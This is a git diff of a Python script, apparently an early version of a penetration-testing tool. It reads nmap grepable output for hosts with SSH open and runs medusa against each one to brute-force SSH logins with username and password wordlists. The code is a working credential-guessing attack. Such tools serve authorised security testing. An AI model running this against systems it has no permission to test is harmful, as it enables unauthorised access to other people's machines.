@@ -1,5 +1,6 @@
 from argparse import RawTextHelpFormatter
 import sys, time, os
+import subprocess
 import re
 import argparse
 import argcomplete
@@ -28,21 +29,9 @@ banner = colors.green + r"""
 + '\n Created by: Jacob Robles/@shellfail && Shane Young/@x90skysn3k' + '\n' + colors.normal + '\n'
 
 
-#def get_ip_and_port():
-#    with open(args.file, 'r') as nmap_file:
-#        for line in nmap_file:
-#            ip = None
-#            try:
-#                ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', line)[0]
-#            except:
-#                pass 
-#            openports = re.findall( '(\d+)\/open', line)
-#            ports = []
-#            ports += openports 
-#            if ip and ports:
-#                outputlist = [ip, ports]
-#                return outputlist
-#                print outputlist
+def do_all():
+    brute_ssh()
+
 
 def ip_by_port(port):
     with open(args.file, 'r') as nmap_file:
@@ -57,8 +46,9 @@ def ip_by_port(port):
 def brute_ssh():                    
     port = 22
     outputlist = ip_by_port(port)
-    print outputlist
-                
+    for ip in outputlist:
+        subprocess.call(['medusa', '-h', ip, '-U', 'wordlist/ssh/user', '-P', 'wordlist/ssh/password', '-M', 'ssh', '-t', args.threads])
+
 
 def parse_args():
     
@@ -71,6 +61,10 @@ def parse_args():
     
     menu_group.add_argument('-f', '--file', help="Gnmap file to parse", required=True)
     
+    menu_group.add_argument('-s', '--service', help="specify service to attack", default="all")
+
+    menu_group.add_argument('-t', '--threads', help="number of medusa threads", default="2")    
+
     argcomplete.autocomplete(parser)    
    
     args = parser.parse_args()
@@ -84,7 +78,10 @@ if __name__ == "__main__":
     print(banner)
     args,output = parse_args()
     
-    if args.file:
+    if args.service == 'ssh':
         brute_ssh()    
    
+    if args.service == 'all':
+        do_all()
+
 
